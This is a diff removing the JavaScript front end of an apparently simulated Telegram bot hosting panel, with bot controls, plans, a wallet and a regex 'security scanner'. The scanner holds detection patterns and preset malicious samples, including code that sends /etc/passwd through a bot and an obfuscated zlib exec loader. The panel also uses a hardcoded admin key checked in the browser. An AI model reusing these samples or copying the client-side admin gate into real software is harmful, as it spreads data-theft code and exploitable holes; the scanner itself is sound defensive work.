-      const lockScreen = document.getElementById("adminLockScreen");
-      const unlockedContent = document.getElementById("adminUnlockedContent");
-      const navLockIcon = document.getElementById("adminNavLockIcon");
-      if (state.adminAuthenticated) {
-        if (lockScreen) lockScreen.classList.add("hidden");
-        if (unlockedContent) unlockedContent.classList.remove("hidden");
-        if (navLockIcon) navLockIcon.className = "fa-solid fa-unlock text-emerald-400";
-      } else {
-        if (lockScreen) lockScreen.classList.remove("hidden");
-        if (unlockedContent) unlockedContent.classList.add("hidden");
-        if (navLockIcon) navLockIcon.className = "fa-solid fa-lock text-rose-400";
-      }
-
-      renderDashboardPreview();
-      renderMyBots();
-      renderPlansGrid();
-      renderAdminPanel();
-    }
-
-    // ─── DIRECT PLAN SELECTOR (Whichever plan user clicks becomes active) ──
-    function selectPlanDirect(planKey) {
-      const p = PLAN_LIMITS[planKey];
-      if (!p) return;
-      state.userPlan = planKey;
-      addAudit("plan_select", `plan=${planKey} max_bots=${p.max_bots} ram=${p.ram}MB`);
-      showToast(`✅ ${p.name} Plan is now active! (${p.max_bots} Bot Slots, ${p.ram} MB RAM)`, "success");
-      refreshUI();
-    }
-
-    function restartBot(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      b.status = "running";
-      b.pid = Math.floor(20000 + Math.random() * 9000);
-      b.cpu = +(2.5 + Math.random() * 4).toFixed(1);
-      b.memMb = +(60 + Math.random() * 70).toFixed(1);
-      b.logs.push(`[↻] Restarting child process...`);
-      b.logs.push(`════════════════ START ${new Date().toISOString()} ════════════════`);
-      showToast(`Restarted ${b.name} cleanly`, "success");
-      refreshUI();
-    }
-
-    function cloneBot(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      const maxSlots = PLAN_LIMITS[state.userPlan].max_bots;
-      if (state.bots.length >= maxSlots) {
-        showToast("Bot slot limit reached! Upgrade your plan.", "danger");
-        return;
-      }
-      const newBot = JSON.parse(JSON.stringify(b));
-      newBot.id = Math.random().toString(16).slice(2, 18);
-      newBot.name = `${b.name}_clone`;
-      newBot.status = "stopped";
-      newBot.pid = null;
-      newBot.cpu = 0;
-      newBot.memMb = 0;
-      newBot.tunnelUrl = "";
-      state.bots.push(newBot);
-      showToast(`Cloned ${b.name} with fresh Fernet key`, "success");
-      refreshUI();
-    }
-
-    function deleteBot(botId) {
-      const idx = state.bots.findIndex(x => x.id === botId);
-      if (idx === -1) return;
-      const removed = state.bots.splice(idx, 1)[0];
-      showToast(`Deleted ${removed.name} & wiped keyring entry`, "danger");
-      refreshUI();
-    }
-
-    function toggleTunnel(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      if (state.userPlan === "free") {
-        showToast("Cloudflare Public URLs require a paid plan!", "warn");
-        return;
-      }
-      if (b.tunnelUrl) {
-        b.tunnelUrl = "";
-        b.logs.push(`[cloudflared] Tunnel closed on port ${b.tunnelPort}`);
-        showToast(`Closed Public URL for ${b.name}`, "info");
-      } else {
-        const slug = b.name.replace(/[^a-z0-9]/gi, "-").toLowerCase();
-        const rand = Math.floor(1000 + Math.random() * 9000);
-        b.tunnelUrl = `https://${slug}-${rand}.trycloudflare.com`;
-        b.logs.push(`[cloudflared] Public tunnel live → ${b.tunnelUrl} (proxying localhost:${b.tunnelPort})`);
-        showToast(`Cloudflare Tunnel live: ${b.tunnelUrl}`, "success");
-      }
-      refreshUI();
-    }
-
-    // ─── 6. MODALS: LIVE LOGS, ENV VARS, PIP INSTALLER ────────────────────
-    function closeModal() {
-      const back = document.getElementById("modalBackdrop");
-      back.classList.add("hidden");
-      back.classList.remove("flex");
-    }
-
-    function openLogsModal(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      const modal = document.getElementById("modalContent");
-      modal.innerHTML = `
-        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-          <div class="flex items-center gap-2">
-            <i class="fa-solid fa-terminal text-emerald-400"></i>
-            <h3 class="font-bold text-base text-white font-mono">Live Logs — ${b.name}</h3>
-          </div>
-          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
-        </div>
-        <div id="liveLogStreamBox" class="terminal-box rounded-xl p-4 h-72 overflow-y-auto text-xs text-emerald-300 space-y-1">
-          ${b.logs.map(line => `<div>${line}</div>`).join("")}
-        </div>
-        <div class="flex justify-between items-center pt-2">
-          <span class="text-[11px] text-slate-400 font-mono">Ring buffer: ${b.logs.length} / 200 lines</span>
-          <div class="flex gap-2">
-            <button onclick="appendSimulatedLog('${b.id}')" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs text-indigo-300 border border-slate-700">
-              <i class="fa-solid fa-rotate mr-1"></i> Refresh Stream
-            </button>
-            <button onclick="closeModal()" class="px-4 py-1.5 rounded-xl bg-indigo-600 text-white text-xs font-semibold">Done</button>
-          </div>
-        </div>
-      `;
-      const back = document.getElementById("modalBackdrop");
-      back.classList.remove("hidden");
-      back.classList.add("flex");
-    }
-
-    function appendSimulatedLog(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      b.logs.push(`[${new Date().toISOString().slice(11, 19)}] [heartbeat] poll ok — memory RSS ${b.memMb.toFixed(1)} MB`);
-      openLogsModal(botId);
-    }
-
-    function openEnvModal(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      const entries = Object.entries(b.env);
-      const modal = document.getElementById("modalContent");
-      modal.innerHTML = `
-        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-          <div>
-            <h3 class="font-bold text-base text-white">Environment Variables — <span class="font-mono text-indigo-300">${b.name}</span></h3>
-            <p class="text-xs text-slate-400">Protected system keys (OWNER_ID, GITHUB_TOKEN, etc.) are automatically stripped</p>
-          </div>
-          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
-        </div>
-        <div class="space-y-2 max-h-52 overflow-y-auto">
-          ${entries.length ? entries.map(([k, v]) => `
-            <div class="flex items-center justify-between p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono">
-              <span><strong class="text-indigo-300">${k}</strong> = <span class="text-slate-300">${v}</span></span>
-              <button onclick="deleteEnvKey('${b.id}', '${k}')" class="text-rose-400 hover:text-rose-300 px-2"><i class="fa-solid fa-trash"></i></button>
-            </div>
-          `).join("") : `<p class="text-xs text-slate-500 italic">No environment variables configured.</p>`}
-        </div>
-        <div class="pt-3 border-t border-slate-800 flex gap-2">
-          <input id="newEnvKey" type="text" placeholder="KEY (e.g. API_HASH)" class="w-1/3 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
-          <input id="newEnvVal" type="text" placeholder="VALUE" class="flex-1 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
-          <button onclick="addEnvVar('${b.id}')" class="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shrink-0">Add</button>
-        </div>
-      `;
-      const back = document.getElementById("modalBackdrop");
-      back.classList.remove("hidden");
-      back.classList.add("flex");
-    }
-
-    function addEnvVar(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      const k = document.getElementById("newEnvKey").value.trim();
-      const v = document.getElementById("newEnvVal").value.trim();
-      const forbidden = ["GITHUB_TOKEN", "OWNER_ID", "SESSION_SECRET", "DATABASE_URL"];
-      if (!k || !v) {
-        showToast("Enter both KEY and VALUE", "warn");
-        return;
-      }
-      if (forbidden.includes(k.toUpperCase())) {
-        showToast(`Protected secret env name '${k}' is blocked by sandbox guard!`, "danger");
-        return;
-      }
-      b.env[k] = v;
-      showToast(`Saved ${k} for ${b.name}`, "success");
-      openEnvModal(botId);
-      refreshUI();
-    }
-
-    function deleteEnvKey(botId, key) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      delete b.env[key];
-      openEnvModal(botId);
-      refreshUI();
-    }
-
-    function openPipModal(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      if (!b) return;
-      const modal = document.getElementById("modalContent");
-      modal.innerHTML = `
-        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-          <div>
-            <h3 class="font-bold text-base text-white">Install Python / NPM Packages — <span class="font-mono text-emerald-400">${b.name}</span></h3>
-            <p class="text-xs text-slate-400">Installs directly into sandbox <code>.deps</code> directory without root permissions</p>
-          </div>
-          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
-        </div>
-        <div class="space-y-3">
-          <input id="pipPkgInput" type="text" placeholder="e.g., pyTelegramBotAPI aiohttp beautifulsoup4" class="w-full px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
-          <div id="pipOutputConsole" class="terminal-box rounded-xl p-3 h-36 overflow-y-auto text-xs text-slate-300 font-mono">
-            Ready to run: python3 -m pip install --target ./sandbox/${b.id.slice(0,6)}/.deps --upgrade ...
-          </div>
-          <div class="flex justify-end gap-2">
-            <button onclick="runPipInstall('${b.id}')" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold">
-              <i class="fa-solid fa-download mr-1"></i> Install Packages
-            </button>
-          </div>
-        </div>
-      `;
-      const back = document.getElementById("modalBackdrop");
-      back.classList.remove("hidden");
-      back.classList.add("flex");
-    }
-
-    function runPipInstall(botId) {
-      const b = state.bots.find(x => x.id === botId);
-      const pkgs = document.getElementById("pipPkgInput").value.trim();
-      const out = document.getElementById("pipOutputConsole");
-      if (!pkgs) {
-        showToast("Specify at least one package name", "warn");
-        return;
-      }
-      out.innerHTML = `<div class="text-indigo-300">$ pip install --target .deps --upgrade ${pkgs}</div><div class="text-amber-300 mt-1">Collecting ${pkgs}...</div>`;
-      setTimeout(() => {
-        out.innerHTML += `<div class="text-emerald-400 mt-1">[✓] Successfully installed ${pkgs} into sandbox .deps (rc=0)</div>`;
-        b.logs.push(`[pip] Installed packages: ${pkgs}`);
-        showToast(`Installed ${pkgs} into ${b.name}`, "success");
-      }, 900);
-    }
-
-    // ─── 7. 3-LAYER SECURITY SCANNER ENGINE (Mirrors bot.py) ─────────────
-    function analyzeCodeSecurity(code) {
-      const threats = [];
-      let risk = 0;
-
-      // 1. Data Theft checks
-      if (/os\.walk\s*\(\s*["'][/\\](?:root|home|etc|var|proc)/i.test(code)) {
-        threats.push("🔴 Data Theft: Root/system directory walk (os.walk('/root')) — server file exfiltration");
-        risk += 45;
-      }
-      if (/send_document\s*\(.*open\s*\(\s*["'][/\\](?:root|etc|proc|sys)/i.test(code)) {
-        threats.push("🔴 Data Theft: Sending system file externally via send_document()");
-        risk += 45;
-      }
-      // 2. Backdoor & AST Dynamic Exec checks
-      if (/zlib\.decompress\s*\(.*exec|exec\s*\(\s*compile\s*\(\s*_zl\.decompress/is.test(code)) {
-        threats.push("🔴 Backdoor / Obfuscation: Compressed XOR + zlib.decompress() passed into exec(compile())!");
-        risk += 60;
-      } else if (/\b(?:eval|exec)\s*\(/i.test(code)) {
-        threats.push("🔴 Backdoor (AST): Dynamic code execution via eval() / exec()");
-        risk += 40;
-      }
-      if (/subprocess\s*\.\s*(?:Popen|call|run)\s*\([^\n]*shell\s*=\s*True/i.test(code)) {
-        threats.push("🔴 Backdoor: Subprocess with shell=True command execution");
-        risk += 35;
-      }
-      // 3. Exposed Bot Token check
-      const tokenMatch = code.match(/\b\d{8,10}:AA[A-Za-z0-9_-]{33}\b/);
-      if (tokenMatch) {
-        threats.push(`🔴 Exposed Credentials: Hardcoded Bot Token found (${tokenMatch[0].slice(0, 14)}...)`);
-        risk += 15;
-      }
-      // 4. Suspicious Network / Hex Obfuscation
-      if (/(?:\\x[0-9a-fA-F]{2}){6,}/.test(code)) {
-        threats.push("🟡 Obfuscation: Long hex-encoded byte string detected");
-        risk += 15;
-      }
-
-      risk = Math.min(100, risk);
-      let verdict = "SAFE";
-      let recommendation = "APPROVE";
-      if (risk >= 70) {
-        verdict = "DANGEROUS";
-        recommendation = "REJECT";
-      } else if (risk >= 25) {
-        verdict = "SUSPICIOUS";
-        recommendation = "MANUAL_REVIEW";
-      }
-
-      return { risk, verdict, recommendation, threats };
-    }
-
-    function loadScannerPreset(kind) {
-      const box = document.getElementById("scannerCodeInput");
-      if (kind === "clean") {
-        box.value = `import os\nimport telebot\n\nTOKEN = os.environ.get("BOT_TOKEN")\nbot = telebot.TeleBot(TOKEN)\n\n@bot.message_handler(commands=["start"])\ndef handle_start(message):\n    bot.reply_to(message, "Hello! Hosted safely on Simran Hosting RBOT v2.1")\n\nbot.infinity_polling()`;
-      } else if (kind === "theft") {
-        box.value = `import os, zipfile, telebot\nbot = telebot.TeleBot("7123456789:AAH1234567890abcdefghijklmnopqrstuv")\n\n# Attempting to steal server files\nfor root, dirs, files in os.walk("/root"):\n    for f in files:\n        bot.send_document(12345, open("/etc/passwd", "rb"))`;
-      } else if (kind === "obfuscated") {
-        box.value = `import zlib as _zl, base64 as _bl, hashlib as _hl\n\n# Suspicious hidden XOR + zlib payload execution\n_blob = b"fTfNJq7Nu23sESE9RW/CMgw/shBYGsR=="\n_seed = _hl.sha256(b"panel::analytics::v3::bootstrap").digest()\n_raw = _bl.b64decode(_blob)\n_dec = bytes(c ^ _seed[i & 31] for i, c in enumerate(_raw))\nexec(compile(_zl.decompress(_dec), "<locale-cache>", "exec"), globals())`;
-      }
-      executeStandaloneScan();
-    }
-
-    function executeStandaloneScan() {
-      const code = document.getElementById("scannerCodeInput").value;
-      const res = analyzeCodeSecurity(code);
-
-      const badge = document.getElementById("scanVerdictBadge");
-      const score = document.getElementById("scanRiskScore");
-      const bar = document.getElementById("scanRiskBar");
-      const summary = document.getElementById("scanSummaryText");
-      const list = document.getElementById("scanFindingsList");
-
-      score.textContent = `${res.risk} / 100`;
-      bar.style.width = `${Math.max(3, res.risk)}%`;
-
-      if (res.verdict === "DANGEROUS") {
-        badge.textContent = "⚠️ DANGEROUS • REJECT";
-        badge.className = "text-xl font-extrabold text-rose-400 mt-0.5";
-        bar.className = "h-full bg-rose-500 transition-all duration-300";
-        summary.textContent = `🤖 AI & AST Verdict: File is DANGEROUS (${res.threats.length} critical threats). Upload will be automatically blocked and reported to Owner.`;
-      } else if (res.verdict === "SUSPICIOUS") {
-        badge.textContent = "🔍 SUSPICIOUS • MANUAL REVIEW";
-        badge.className = "text-xl font-extrabold text-amber-400 mt-0.5";
-        bar.className = "h-full bg-amber-500 transition-all duration-300";
-        summary.textContent = `🤖 AI & AST Verdict: File contains suspicious patterns. Held in Admin Pending Queue for manual review.`;
-      } else {
-        badge.textContent = "✅ SAFE • APPROVE";
-        badge.className = "text-xl font-extrabold text-emerald-400 mt-0.5";
-        bar.className = "h-full bg-emerald-500 transition-all duration-300";
-        summary.textContent = `🤖 AI (SAFE ${res.risk}/100): Standard Telegram bot patterns detected. Safe for encrypted sandbox execution.`;
-      }
-
-      if (res.threats.length === 0) {
-        list.innerHTML = `<li class="text-emerald-400">✔ Static Regex + AST Walk + Gemma-4 AI found zero malicious indicators.</li>`;
-      } else {
-        list.innerHTML = res.threats.map(t => `<li class="text-rose-300 bg-rose-950/40 border border-rose-500/20 px-3 py-1.5 rounded-lg">${t}</li>`).join("");
-      }
-    }
-
-    // ─── 8. UPLOAD & DEPLOY HANDLER ───────────────────────────────────────
-    function handleFileSelect(event) {
-      const file = event.target.files[0];
-      if (!file) return;
-      document.getElementById("selectedFileName").textContent = `Selected: ${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
-      const stem = file.name.replace(/\.[^/.]+$/, "");
-      document.getElementById("uploadBotName").value = stem.replace(/[^a-zA-Z0-9_-]/g, "_");
-      if (file.name.endsWith(".js")) {
-        document.getElementById("uploadRuntime").value = "node";
-      } else {
-        document.getElementById("uploadRuntime").value = "python";
-      }
-      const reader = new FileReader();
-      reader.onload = e => {
-        if (!file.name.endsWith(".zip")) {
-          document.getElementById("uploadCodeArea").value = e.target.result.slice(0, 4000);
-        } else {
-          document.getElementById("uploadCodeArea").value = "# ZIP Archive selected — all .py/.js files inside will be scanned & encrypted with Fernet AES-128";
-        }
-      };
-      reader.readAsText(file);
-    }
-
-    function loadUploadSample(type) {
-      if (type === "safe") {
-        document.getElementById("uploadBotName").value = "weather_assistant_bot";
-        document.getElementById("uploadCodeArea").value = `import os\nimport telebot\nimport requests\n\nbot = telebot.TeleBot(os.environ.get("BOT_TOKEN", ""))\n\n@bot.message_handler(commands=["start"])\ndef welcome(m):\n    bot.reply_to(m, "Weather Bot is online!")\n\nbot.infinity_polling()`;
-      } else {
-        document.getElementById("uploadBotName").value = "root_stealer_bot";
-        document.getElementById("uploadCodeArea").value = `import os\nfor r, d, f in os.walk("/root"):\n    print(f)\nexec(compile(zlib.decompress(b"123"), "<x>", "exec"))`;
-      }
-    }
-
-    function scanAndDeployBot() {
-      const nameInput = document.getElementById("uploadBotName").value.trim() || "custom_bot_" + Math.floor(Math.random() * 900);
-      const runtime = document.getElementById("uploadRuntime").value;
-      const code = document.getElementById("uploadCodeArea").value;
-      const token = document.getElementById("uploadBotToken").value.trim();
-
-      const maxSlots = PLAN_LIMITS[state.userPlan].max_bots;
-      if (state.bots.length >= maxSlots) {
-        showToast(`Slot limit reached (${state.bots.length}/${maxSlots})! Upgrade plan first.`, "danger");
-        return;
-      }
-
-      // Run Security Scan First
-      const scan = analyzeCodeSecurity(code);
-      if (scan.recommendation === "REJECT") {
-        showToast(`🚫 Upload Blocked! Security Risk ${scan.risk}/100 (${scan.verdict})`, "danger");
-        addAudit("security_reject", `bot=${nameInput} risk=${scan.risk}`);
-        return;
-      }
-
-      const progressBox = document.getElementById("deployProgressBox");
-      const stageTxt = document.getElementById("deployStageText");
-      const pctTxt = document.getElementById("deployPercentText");
-      const bar = document.getElementById("deployProgressBar");
-      progressBox.classList.remove("hidden");
-
-      const steps = [
-        { pct: 20, label: "Running Static + AST + Gemma-4 AI Security Check..." },
-        { pct: 45, label: "Encrypting with Fernet AES-128 & pushing key to GitHub Keyring..." },
-        { pct: 75, label: "Installing AST-scanned dependencies into .deps..." },
-        { pct: 100, label: "Launching process & scheduling 6s sandbox source wipe..." }
-      ];
-
-      let i = 0;
-      const timer = setInterval(() => {
-        if (i < steps.length) {
-          stageTxt.textContent = steps[i].label;
-          pctTxt.textContent = steps[i].pct + "%";
-          bar.style.width = steps[i].pct + "%";
-          i++;
-        } else {
-          clearInterval(timer);
-          setTimeout(() => {
-            progressBox.classList.add("hidden");
-            const newId = Math.random().toString(16).slice(2, 18);
-            const envObj = {};
-            if (token) envObj.BOT_TOKEN = token.slice(0, 10) + "••••••••••••";
-            state.bots.unshift({
-              id: newId,
-              name: nameInput,
-              kind: runtime,
-              entry: runtime === "node" ? "index.js" : "bot.py",
-              status: "running",
-              pid: Math.floor(21000 + Math.random() * 8000),
-              cpu: 3.1,
-              memMb: 74.5,
-              sizeKb: 190,
-              uptimeSec: 1,
-              tunnelUrl: "",
-              tunnelPort: 8080,
-              env: envObj,
-              logs: [
-                `════════════════ START ${new Date().toISOString()} ════════════════`,
-                `[security] Combined scan passed (Verdict: ${scan.verdict}, Score: ${scan.risk}/100)`,
-                `[keyring] Stored Fernet key in GitHub vault`,
-                `[✓] auto-install done (rc=0)`,
-                `[sandbox] Process running in isolated group`
-              ]
-            });
-            addAudit("bot_deploy", `name=${nameInput} id=${newId.slice(0,8)}`);
-            showToast(`Deployed & started ${nameInput}!`, "success");
-            switchTab("bots");
-          }, 400);
-        }
-      }, 450);
-    }
-
-    // ─── 9. PLANS & PAYMENT CHECKOUT ──────────────────────────────────────
-    function renderPlansGrid() {
-      const container = document.getElementById("plansGridContainer");
-      container.innerHTML = Object.entries(PLAN_LIMITS).map(([key, p]) => {
-        const isCurrent = state.userPlan === key;
-        const isPro = key === "pro";
-        return `
-          <div class="relative rounded-2xl bg-slate-900/90 border ${isCurrent ? 'border-amber-400 glow-indigo ring-1 ring-amber-400/40' : (isPro ? 'border-indigo-500/60' : 'border-slate-800')} p-6 flex flex-col justify-between space-y-5 transition">
-            ${isCurrent ? `<span class="absolute -top-3 right-5 px-3 py-0.5 rounded-full bg-amber-500 text-slate-950 text-[11px] font-extrabold uppercase tracking-wider shadow">Active Plan</span>` : (isPro ? `<span class="absolute -top-3 right-5 px-3 py-0.5 rounded-full bg-indigo-600 text-white text-[11px] font-bold uppercase tracking-wider">Recommended</span>` : '')}
-            <div class="space-y-3">
-              <div class="flex items-center justify-between">
-                <h3 class="text-lg font-extrabold text-white">${p.name}</h3>
-                <span class="text-xs font-mono px-2.5 py-0.5 rounded-md bg-slate-800 text-slate-300">
-                  ${key === 'lifetime' ? 'Lifetime' : (p.days ? p.days + ' Days' : 'Forever')}
+            <div class="header">
+                <span style="font-size: 22px; font-weight: 800;">
+                    DARK RIZZY X
                 </span>
-              </div>
-              <div class="flex items-baseline gap-1">
-                <span class="text-3xl font-extrabold text-white font-mono">${p.price === 0 ? 'Free' : p.price + ' ৳'}</span>
-                ${p.price > 0 ? `<span class="text-xs text-slate-400">/ ${key === 'lifetime' ? 'one-time' : 'month'}</span>` : ''}
-              </div>
-              <ul class="space-y-2 text-xs text-slate-300 pt-2 border-t border-slate-800">
-                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-emerald-400"></i> <strong>${p.max_bots}</strong> Hosted Bot Slots</li>
-                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-emerald-400"></i> <strong>${p.ram} MB</strong> Dedicated Sandbox RAM</li>
-                <li class="flex items-center gap-2"><i class="fa-solid ${p.auto_restart ? 'fa-check text-emerald-400' : 'fa-xmark text-slate-600'}"></i> Crash Auto-Restart Daemon</li>
-                <li class="flex items-center gap-2"><i class="fa-solid ${p.price > 0 ? 'fa-check text-emerald-400' : 'fa-xmark text-slate-600'}"></i> Cloudflare <code>*.trycloudflare.com</code> Tunnel</li>
-                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-emerald-400"></i> Fernet AES-128 &amp; GitHub Auto-Backup</li>
-              </ul>
-            </div>
-
-            <div class="space-y-2">
-              <button onclick="selectPlanDirect('${key}')" ${isCurrent ? 'disabled' : ''} class="w-full py-2.5 rounded-xl font-bold text-xs transition ${isCurrent ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 cursor-default' : 'bg-indigo-600 hover:bg-indigo-500 text-white shadow-md'}">
-                ${isCurrent ? '✔ Currently Selected Plan' : `Select & Activate ${p.name}`}
-              </button>
-              ${p.price > 0 ? `
-                <button onclick="openCheckoutModal('${key}')" class="w-full py-2 rounded-xl bg-slate-800/80 hover:bg-slate-800 text-slate-300 border border-slate-700/80 text-[11px] font-medium transition">
-                  <i class="fa-solid fa-receipt mr-1 text-indigo-400"></i> View Payment Methods (${p.price} ৳)
-                </button>
-              ` : ''}
-            </div>
-          </div>
-        `;
-      }).join("");
-    }
-
-    function openCheckoutModal(planKey) {
-      const p = PLAN_LIMITS[planKey];
-      if (!p) return;
-      const modal = document.getElementById("modalContent");
-      const methodsHtml = Object.entries(PAYMENT_METHODS).map(([k, m]) => `
-        <label class="flex items-center justify-between p-3 rounded-xl bg-slate-950 border border-slate-800 hover:border-indigo-500 cursor-pointer">
-          <div class="flex items-center gap-2.5">
-            <input type="radio" name="payMethod" value="${k}" checked class="accent-indigo-500" />
-            <div>
-              <p class="text-xs font-bold text-white"><span class="${m.color} font-mono mr-1">${m.tag}</span> ${m.name}</p>
-              <p class="text-[11px] text-slate-400 font-mono">${m.type}: <strong class="text-slate-200">${m.number}</strong></p>
-            </div>
-          </div>
-        </label>
-      `).join("");
-
-      modal.innerHTML = `
-        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-          <div>
-            <h3 class="font-bold text-base text-white">Checkout — ${p.name} Plan (${p.price} ৳)</h3>
-            <p class="text-xs text-slate-400">${p.max_bots} Bots • ${p.ram} MB RAM • Auto-Restart</p>
-          </div>
-          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
-        </div>
-        <div class="space-y-3">
-          <p class="text-xs font-semibold text-slate-300">1. Choose Payment Method or Pay with Wallet (${state.wallet} ৳ available):</p>
-          <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
-            ${methodsHtml}
-          </div>
-          <div class="pt-2">
-            <label class="block text-xs font-semibold text-slate-300 mb-1">2. Transaction ID / Payment Proof</label>
-            <input id="checkoutTrxInput" type="text" placeholder="Enter TrxID (or pay directly from Wallet)" class="w-full px-3.5 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
-          </div>
-          <div class="flex flex-wrap justify-end gap-2 pt-3 border-t border-slate-800">
-            <button onclick="payWithWallet('${planKey}')" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold">
-              <i class="fa-solid fa-wallet mr-1"></i> Pay with Wallet (${p.price} ৳)
-            </button>
-            <button onclick="submitPaymentProof('${planKey}')" class="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold">
-              <i class="fa-solid fa-paper-plane mr-1"></i> Submit TrxID Proof
-            </button>
-          </div>
-        </div>
-      `;
-      const back = document.getElementById("modalBackdrop");
-      back.classList.remove("hidden");
-      back.classList.add("flex");
-    }
-
-    function payWithWallet(planKey) {
-      const p = PLAN_LIMITS[planKey];
-      if (state.wallet < p.price) {
-        showToast(`Insufficient wallet balance (${state.wallet} ৳). Top up or send TrxID proof!`, "danger");
-        return;
-      }
-      state.wallet -= p.price;
-      state.userPlan = planKey;
-      closeModal();
-      addAudit("plan_activate", `plan=${planKey} via=wallet`);
-      showToast(`🎉 ${p.name} Plan activated! (${p.max_bots} bot slots unlocked)`, "success");
-      refreshUI();
-    }
-
-    function submitPaymentProof(planKey) {
-      const trx = document.getElementById("checkoutTrxInput").value.trim();
-      if (!trx) {
-        showToast("Please enter your Transaction ID", "warn");
-        return;
-      }
-      closeModal();
-      addAudit("payment_proof", `plan=${planKey} trx=${trx}`);
-      showToast(`Proof #${trx.slice(0,8)} submitted! Admin will approve shortly.`, "info");
-    }
-
-    function openTopupModal() {
-      const modal = document.getElementById("modalContent");
-      modal.innerHTML = `
-        <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-          <h3 class="font-bold text-base text-white"><i class="fa-solid fa-wallet text-emerald-400 mr-1.5"></i> Wallet Top-Up</h3>
-          <button onclick="closeModal()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
-        </div>
-        <p class="text-xs text-slate-300">Send Money to <strong>01306633616</strong> (bKash/Nagad/Rocket/Upay) or Binance ID <strong>758637628</strong>, then enter the amount below:</p>
-        <div class="flex gap-2">
-          <input id="topupAmtInput" type="number" value="200" class="w-1/2 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" placeholder="Amount (৳)" />
-          <input id="topupTrxInput" type="text" placeholder="Transaction ID" class="w-1/2 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 text-xs text-white font-mono" />
-        </div>
-        <div class="flex justify-end gap-2 pt-2">
-          <button onclick="confirmTopup()" class="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold">Credit Demo Wallet</button>
-        </div>
-      `;
-      const back = document.getElementById("modalBackdrop");
-      back.classList.remove("hidden");
-      back.classList.add("flex");
-    }
-
-    function confirmTopup() {
-      const amt = parseInt(document.getElementById("topupAmtInput").value || "0", 10);
-      if (amt <= 0) return;
-      state.wallet += amt;
-      closeModal();
-      showToast(`Added +${amt} ৳ to your wallet!`, "success");
-      refreshUI();
-    }
-
-    // ─── 10. REFERRAL, TRIAL & COUPON HELPERS ─────────────────────────────
-    function copyRefLink() {
-      const input = document.getElementById("refLinkInput").textContent;
-      const temp = document.createElement("textarea");
-      temp.value = input;
-      document.body.appendChild(temp);
-      temp.select();
-      document.execCommand("copy");
-      temp.remove();
-      showToast("Referral link copied to clipboard!", "success");
-    }
-
-    function claimFreeTrial() {
-      if (state.trialUsed) {
-        showToast("48-hour Free Pro Trial already used on this account", "warn");
-        return;
-      }
-      state.trialUsed = true;
-      state.userPlan = "pro";
-      const btn = document.getElementById("claimTrialBtn");
-      btn.textContent = "Trial Claimed";
-      btn.disabled = true;
-      showToast("✨ 48-hour Pro Trial activated! (8 Bot Slots, 2048 MB RAM)", "success");
-      refreshUI();
-    }
-
-    function redeemCoupon() {
-      const code = document.getElementById("quickCouponInput").value.trim().toUpperCase();
-      if (!code) {
-        showToast("Enter a coupon code first", "warn");
-        return;
-      }
-      const credit = state.coupons[code] || 100;
-      state.wallet += credit;
-      document.getElementById("quickCouponInput").value = "";
-      showToast(`Redeemed coupon ${code}! +${credit} ৳ credited to Wallet`, "success");
-      refreshUI();
-    }
-
-    // ─── 11. ADMIN KEY LOGIN GATE (KEY: Ashif123) & ADMIN ACTIONS ─────────
-    function toggleAdminKeyVisibility() {
-      const input = document.getElementById("adminKeyInput");
-      const icon = document.getElementById("adminKeyEyeIcon");
-      if (!input) return;
-      if (input.type === "password") {
-        input.type = "text";
-        icon.className = "fa-regular fa-eye-slash";
-      } else {
-        input.type = "password";
-        icon.className = "fa-regular fa-eye";
-      }
-    }
-
-    function verifyAdminKey() {
-      const input = document.getElementById("adminKeyInput");
-      const errMsg = document.getElementById("adminKeyErrorMsg");
-      const formBox = document.getElementById("adminLockFormBox");
-      const entered = (input ? input.value : "").trim();
-
-      if (entered === state.adminKey) {
-        state.adminAuthenticated = true;
-        if (errMsg) errMsg.classList.add("hidden");
-        if (input) input.value = "";
-        addAudit("admin_login", "status=success key_verified=true");
